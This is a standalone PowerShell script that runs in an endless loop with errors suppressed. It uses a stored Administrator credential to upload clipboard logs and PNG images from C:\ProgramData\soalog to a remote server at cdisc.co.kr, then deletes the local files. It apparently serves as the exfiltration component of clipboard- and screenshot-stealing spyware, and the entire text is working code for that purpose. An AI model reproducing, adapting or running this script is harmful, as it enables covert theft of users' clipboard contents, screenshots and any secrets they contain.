do {
$ErrorActionPreference = 'silentlycontinue'
Import-Module bitstransfer
$enc = Get-Content C:\Windows\soa\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
$user = "Administrator" # server ID
$cred = New-Object System.Management.Automation.PSCredential($user,$enc)
#$src = "C:\ProgramData\soalog\" # directory in which files to be sent
$src = "C:\ProgramData\soalog\*_clip_process.txt", "C:\ProgramData\soalog\*.png", "C:\ProgramData\soalog\clip.txt"
Get-ChildItem -path $src |
foreach {
$dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
$job = Start-BitsTransfer -source $($_.FullName) -Destination $dst -Credential $cred -TransferType Upload -Asynchronous
while (($job.jobstate -eq "Transferring") -or ($job.jobstate -eq "Connecting"))
{sleep 10;}
if ($job.JobState -eq "Transferred")
{
Remove-Item $($_.FullName)
}
Switch($job.jobstate)
{
"Transferred" {Complete-BitsTransfer -BitsJob $job}
"TransientError" {Resume-BitsTransfer -BitsJob $job}
"Error" {Resume-BitsTransfer -BitsJob $job}
}
}
sleep 1
} 
while ($true)